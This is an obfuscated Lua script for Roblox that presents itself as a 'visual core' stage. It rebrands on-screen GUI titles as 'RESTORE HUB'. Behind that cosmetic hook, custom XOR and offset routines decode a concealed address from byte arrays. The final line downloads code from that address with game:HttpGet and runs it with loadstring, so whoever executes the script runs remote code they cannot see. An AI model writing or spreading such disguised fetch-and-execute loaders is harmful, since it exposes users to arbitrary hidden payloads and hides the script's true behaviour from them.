
--[[ STAGE 2: VISUAL CORE ]]
local IIF0HloKeg1i0OlvAE4z = bit32 and bit32.bxor
if not IIF0HloKeg1i0OlvAE4z then
    IIF0HloKeg1i0OlvAE4z = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function rtWa1FjjZOI4nPmYu(data, a, b, m, s, r, z)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local drift = (b + i * s + (z or 0)) % 256
        if m == 0 then
            v = (v - drift) % 256
            v = IIF0HloKeg1i0OlvAE4z(v, a)
        else
            v = IIF0HloKeg1i0OlvAE4z(v, a)
            v = (v - drift) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local KlQ_m3oWTM6K1_yxwc = {
  {{34, 197, 220, 206}, 85, 249, 1, 6, true, 4, 22},
  {{242, 13, 3}, 172, 22, 0, 2, false, 18, 26},
  {{168, 221, 218, 240, 250, 251, 206}, 20, 62, 1, 7, true, 15, 24},
  {{2, 28, 22, 4, 208}, 42, 171, 1, 1, false, 9, 27},
  {{28, 15, 13, 46, 49, 79, 45}, 79, 226, 0, 6, false, 14, 17},
  {{92, 82, 101, 92, 104, 112}, 227, 184, 0, 2, true, 5, 22},
  {{125, 215, 197, 206, 227, 209}, 141, 214, 0, 4, true, 6, 0},
  {{156, 174, 153, 157, 212, 138}, 122, 96, 1, 4, false, 11, 11},
  {{117, 123, 115, 104, 118}, 31, 235, 1, 2, true, 10, 18},
  {{39, 19, 99, 88}, 57, 210, 1, 4, true, 17, 26},
  {{208, 231, 221, 152, 213, 223}, 178, 214, 1, 4, false, 3, 22},
  {{87, 38, 37, 56}, 237, 73, 1, 5, false, 8, 11},
  {{0, 254, 1, 72, 46, 77}, 236, 94, 0, 6, false, 12, 15},
  {{73, 51, 89, 95, 115, 118, 105}, 192, 139, 0, 5, false, 13, 26},
  {{244, 217, 218}, 244, 61, 0, 1, false, 1, 26},
  {{34, 39, 25, 85, 89}, 177, 111, 0, 5, true, 2, 16},
  {{164, 174, 174, 90, 107}, 210, 52, 1, 5, false, 16, 9},
  {{210, 32, 32, 228, 39, 40, 43}, 161, 12, 1, 2, false, 7, 2}
}
local wcAmTJ2d94R105rSede5MW = {}
for pNQQ6EIZJi9oECd = 1, #KlQ_m3oWTM6K1_yxwc do
    local UEauQ3pfFB8wYlh = KlQ_m3oWTM6K1_yxwc[pNQQ6EIZJi9oECd]
    wcAmTJ2d94R105rSede5MW[UEauQ3pfFB8wYlh[7]] = rtWa1FjjZOI4nPmYu(
        UEauQ3pfFB8wYlh[1],
        UEauQ3pfFB8wYlh[2],
        UEauQ3pfFB8wYlh[3],
        UEauQ3pfFB8wYlh[4],
        UEauQ3pfFB8wYlh[5],
        UEauQ3pfFB8wYlh[6],
        UEauQ3pfFB8wYlh[8]
    )
end
local CO2eQu5EUQ_Z = table.concat(wcAmTJ2d94R105rSede5MW)
local HubName = "RESTORE HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(CO2eQu5EUQ_Z))()
